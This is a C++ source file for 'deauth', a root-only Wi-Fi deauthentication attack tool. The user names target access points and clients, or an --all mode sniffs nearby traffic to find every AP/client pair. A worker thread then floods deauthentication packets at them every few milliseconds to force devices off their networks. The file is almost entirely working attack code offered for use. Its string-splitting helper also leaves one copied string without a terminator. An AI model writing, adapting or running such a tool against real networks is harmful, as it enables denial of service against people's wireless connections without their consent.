//
//  main.cpp
//  deauth
//
//  Created by BlueCocoa on 2017/5/19.
//  Copyright © 2017 BlueCocoa. All rights reserved.
//

#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/signal.h>
#include <unistd.h>
#include <atomic>
#include <algorithm>
#include <condition_variable>
#include <mutex>
#include <iostream>
#include <vector>
#include <thread>
#include "WirelessKit.hpp"

using namespace std;
using namespace WirelessKit;

#ifndef DEFAULT_WLAN
    #if defined(__APPLE__)
        #define DEFAULT_WLAN "en0"
    #elif defined(__RASPBIAN__)
        #define DEFAULT_WLAN "wlan0"
    #endif
#endif

const struct option options[] = {
    { "all",       no_argument,       NULL, 'a' },
    { "bssid",     optional_argument, NULL, 'b' },
    { "mac",       optional_argument, NULL, 'm' },
    { "ifname",    optional_argument, NULL, 'i' },
    { "specify",   optional_argument, NULL, 's' },
    { "whitelist", optional_argument, NULL, 'w'},
    { "help",      no_argument,       NULL, 'h' },
};

void split(const char * to_split, char by, char ** head, char ** tail);
void quit(int);

atomic_bool working;
condition_variable cond;
vector<DeauthClient> specify;
vector<DeauthClient> deauth;
vector<AP> APs;
vector<STA> stations;
vector<STA> whitelist;
mutex global_mtx;

int main(int argc, const char * argv[]) {
    if (getuid()) {
        fprintf(stderr, "This tool requires root privileges\n");
        exit(EXIT_FAILURE);
    }
    
    Interface ifname(DEFAULT_WLAN);
        
    bool all = false;

    int arg, argslot;
    while (argslot = -1, (arg = getopt_long(argc, (char * const *)argv, "ab:m:i:hw:s:", options, &argslot)) != -1) {
        switch (arg) {
            case 'a' : {
                all = true;
                break;
            }
            case 'b' : {
                MAC bssid(optarg);
                if (bssid.is_valid()) APs.emplace_back(AP(bssid));
                break;
            }
            case 'm' : {
                MAC mac(optarg);
                if (mac.is_valid()) stations.emplace_back(STA(mac));
                break;
            }
            case 'i' : {
                ifname = Interface(optarg);
                break;
            }
            case 'h' : {
                fprintf(stdout, "%s [-a|--all] [-i|--ifname " DEFAULT_WLAN "] [-b|--bssid BB:BB:BB:BB:BB:BB] [-m|--mac CC:CC:CC:CC:CC:CC] [-s|--specify CC:CC:CC:CC:CC:CC@BB:BB:BB:BB:BB:BB] [-w|--whitelist CC:CC:CC:CC:CC:CC]\nUse at your own risk & don't be jerk!\n", argv[0]);
                break;
            }
            case 's' : {
                char * mac_str = NULL, * bssid_str = NULL;
                split(optarg, '@', &mac_str, &bssid_str);
                if (mac_str && bssid_str) {
                    MAC bssid(bssid_str), mac(mac_str);
                    if (bssid.is_valid() && mac.is_valid()) {
                        specify.emplace_back(DeauthClient(AP(bssid), STA(mac)));
                    }
                }
                
                if (mac_str) delete [] mac_str;
                if (bssid_str) delete [] bssid_str;
                break;
            }
            case 'w' : {
                MAC mac(optarg);
                if (mac.is_valid()) whitelist.emplace_back(STA(mac));
                break;
            }
        }
    }
    
    for (AP & ap : APs) {
        for (STA & station : stations) {
            deauth.emplace_back(DeauthClient(ap, station));
        }
    }
    
#if defined(__RASPBIAN__)
    pcap_t * pcap_handle = NULL;
    char pcap_error[PCAP_ERRBUF_SIZE];
    pcap_handle = pcap_open_live(ifname._ifname.c_str(), 65536, 1, 1, pcap_error);
    pcap_set_datalink(pcap_handle, DLT_IEEE802_11_RADIO);
    pcap_set_rfmon(pcap_handle, 1);
    ifname._pcap_handle = pcap_handle;
#endif
    
    if (ifname.open() && (deauth.size() + specify.size() > 0 || all)) {
        working = true;
        signal(SIGINT, quit);
        
        Sniffer sniffer(ifname);
        if (all) {
            sniffer.capture([&](const CapturedPacket & packet) -> bool {
                STA station;
                AP ap;
                if (packet.is_valid()) {
                    bool has_client = false;
                    if (packet.header()->fc.from_ds == 0 && packet.header()->fc.to_ds == 1) {
                        ap.setMAC(*packet.header()->destination());
                        station.setMAC(*packet.header()->transmitter());
                        has_client = true;
                    } else if (packet.header()->fc.from_ds == 0 && packet.header()->fc.to_ds == 0) {
                        ap.setMAC(*packet.header()->transmitter());
                        if (!packet.header()->transmitter()->is_equal(*packet.header()->destination())) {
                            station.setMAC(*packet.header()->destination());
                            has_client = true;
                        }
                    } else if (packet.header()->fc.from_ds == 1 && packet.header()->fc.to_ds == 0) {
                        ap.setMAC(*packet.header()->transmitter());
                        station.setMAC(*packet.header()->destination());
                        has_client = true;
                    }
                    
                    if (has_client) {
                        uint8_t * mac = station.mac();
                        if (mac[0] == 0x33 && mac[1] == 0x33) has_client = false;
                        if (mac[0] == 0x01 && mac[1] == 0x00) has_client = false;
                        if (mac[0] == 0xFF && mac[1] == 0xFF) has_client = false;
                    }
                    
                    if (has_client) {
                        if (!std::any_of(whitelist.begin(), whitelist.end(), [&station](const STA & _) -> bool {
                            if (_._mac->is_equal(*station._mac)) {
                                return true;
                            }
                            return false;
                        })) {
                            {
                                lock_guard<mutex> locker(global_mtx);
                                
                                if (!std::any_of(APs.begin(), APs.end(), [&ap](const AP & _) -> bool {
                                    if (_._mac->is_equal(*ap._mac)) {
                                        return true;
                                    }
                                    return false;
                                })) {
                                    APs.emplace_back(ap);
                                }
                                
                                if (!std::any_of(stations.begin(), stations.end(), [&station](const STA & _) -> bool {
                                    if (_._mac->is_equal(*station._mac)) {
                                        return true;
                                    }
                                    return false;
                                })) {
                                    stations.emplace_back(station);
                                }
                                
                                deauth.erase(deauth.begin(), deauth.end());
                                for (AP & ap : APs) {
                                    for (STA & station : stations) {
                                        deauth.emplace_back(DeauthClient(ap, station));
                                    }
                                }
                            }
                        }
                    }
                }
                return working;
            });
        }
        
        uint64_t count = 0;
        fprintf(stdout, "\n");
        std::thread worker{[&count, &ifname]{
            while (working) {
                {
                    lock_guard<mutex> locker(global_mtx);
                    
                    for (auto iter = specify.begin(); iter != specify.end(); iter++) {
                        DeauthClient & client = *iter;
                        client.deauth(ifname);
                        count++;
                    }
                    
                    for (auto iter = deauth.begin(); iter != deauth.end(); iter++) {
                        DeauthClient & client = *iter;
                        client.deauth(ifname);
                        count++;
                    }
                    fprintf(stdout, "%llu deauthentication packets sent!\r", count);
                    fflush(stdout);
                }
                usleep(5000);
            }
        }};
        
        std::mutex mtx;
        std::thread ([&]{
            std::unique_lock<std::mutex> lock(mtx);
            cond.wait(lock);
            working = false;
            fprintf(stdout, "\r%llu deauthentication packets sent in total!\n", count);
        }).join();
    }
    
    return 0;
}

void split(const char * to_split, char by, char ** head, char ** tail) {
    for (size_t i = 0; i < strlen(to_split); ++i) {
        if (to_split[i] == by) {
            if (head) {
                char * h = new char[i];
                memcpy(h, to_split, i);
                *head = h;
            }
            if (tail) {
                char * t = new char[strlen(to_split) - i + 2];
                memcpy(t, to_split + i + 1, strlen(to_split) - i + 1);
                *tail = t;
            }
            break;
        }
    }
}

void quit(int) {
    working = false;
    cond.notify_one();
}
